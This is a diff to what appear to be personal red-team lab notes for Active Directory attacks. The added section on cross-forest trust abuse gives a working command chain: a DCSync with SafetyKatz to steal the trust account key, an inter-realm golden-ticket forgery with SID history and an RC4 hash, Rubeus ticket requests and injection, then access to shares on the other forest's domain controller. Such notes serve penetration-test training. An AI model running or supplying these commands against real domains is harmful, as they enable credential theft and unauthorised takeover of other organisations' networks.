@@ -408,8 +408,25 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /domain:dolla
 #3- Use Rubeus to request TGS
 Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
 ls \\mcorp-dc.moneycorp.local\c$
+```
 
+Trusts Abuse Across Forests
+```powershell
+# In across forest trust any SID history between 500 & 1000 would be filtered out. Only explicit resources are allowed to be accessed from the AD to the other forest. 
 
+#1- DCSync Attack to get the key from the TRUST_ACCOUNT
+C:\AD\Tools\Safetykatz.exe "lsadump::dcsync /user:dcorp\eurocorp$" "exit"
+
+#2- Forge inter-realm TGT 
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-15-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+
+#3- Use Rubeus to request TGS & access shared resources
+Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+dir \\eurocorp-dc.eurocorp.local\c$   #if you try to access desk C, you will get access denied. You should access an explicit resource.
+net view \\eurocorp-dc.eurocorp.local   #Enum all shares
+dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp   #this would work fine
+
+klist purge   #to delete all tickets
 ```
 
 
